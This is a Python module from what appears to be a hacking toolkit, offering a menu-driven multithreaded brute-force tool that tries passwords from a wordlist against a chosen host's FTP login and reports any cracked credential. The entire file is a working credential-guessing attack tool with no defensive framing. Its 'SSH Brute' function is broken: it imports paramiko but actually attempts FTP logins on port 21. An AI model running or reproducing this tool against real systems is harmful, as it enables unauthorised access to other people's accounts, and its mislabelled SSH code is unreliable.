from colored import fg, bg, attr
import colored
import socket as sock
from  Modules import intro
import ftplib
from threading import Thread
import queue
import logging 
import paramiko
logging.disable(logging.CRITICAL)



class Brute_Force:
        global q 
        q = queue.Queue()
        def __init__(self):
            #self.q = queue.Queue()
            self.angry1 = colored.fg("green") + colored.attr("bold")
            self.angry2 = colored.fg("red") + colored.attr("bold")
            self.angry = colored.fg("white") + colored.attr("bold")
            print(f"""{self.angry1}
            1 - FTP Brute 
            2 - SSH Brute 
            0 - back   
            """)
            
            self.number = str(input("[?]>>"))
                
            if self.number ==str(1) or "use ftp" in self.number  :
                            
                self.host = str(input("HOST : "))  
                self.user = str(input("USER : ")) 
                self.passwords = str(input("File : "))
                self.passwords = open(self.passwords).read().split("\n")
                self.threads = int(input("Threads : ")) 
                print("[+] Passwords to try:", len(self.passwords))
                for password in self.passwords:
                    q.put(password)
                for t in range(self.threads):
                    self.thread = Thread(target=self.ftp_brute)
                    self.thread.daemon = True
                    self.thread.start()
            if self.number ==str(2) or "use ssh" in  self.number:
                self.host = str(input("HOST : "))  
                self.user = str(input("USER : ")) 
                self.passwords = str(input("File : "))
                self.passwords = open(self.passwords).read().split("\n")
                self.threads = int(input("Threads : ")) 
                print("[+] Passwords to try:", len(self.passwords))
                for password in self.passwords:
                    q.put(password)
                for t in range(self.threads):
                    self.thread = Thread(target=self.ssh_brute)
                    self.thread.daemon = True
                    self.thread.start()

            if self.number ==str(99) or "back" in self.number :
                intro.main()




            q.join()




        






        def ftp_brute(self):

                
            try :

                        
                while True :

                    password = q.get()
                    print(f"{self.angry2}[#] Trying",f"{self.user}:{password}")
                    try:

                        server = ftplib.FTP()
                        server.connect(self.host,port=21, timeout=5)
                        server.login(self.user, password)
                    except ftplib.error_perm:
                            pass
                    else:

                        print(f"{self.angry1}[+] Found Crack FTP: \n HOST : {self.host} \n Password : {password} {self.angry}")
                        with q.mutex:

                            q.queue.clear()
                            q.all_tasks_done.notify_all()
                            q.unfinished_tasks = 0
                    finally :
                            q.task_done()

            except:
                pass

        def ssh_brute(self):

                
            try :      
                while True :
                    password = q.get()
                    print(f"{self.angry2}[#] Trying",f"{self.user}:{password}")
                    try:

                        server = ftplib.FTP()
                        server.connect(self.host,port=21, timeout=5)
                        server.login(self.user, password)
                    except ftplib.error_perm:
                            pass
                    else:

                        print(f"{self.angry1}[+] Found Crack SSH: \n HOST : {self.host} \n Password : {password} {self.angry} ")
                        with q.mutex:

                            q.queue.clear()
                            q.all_tasks_done.notify_all()
                            q.unfinished_tasks = 0
                    finally :
                            q.task_done()

            except :
                pass









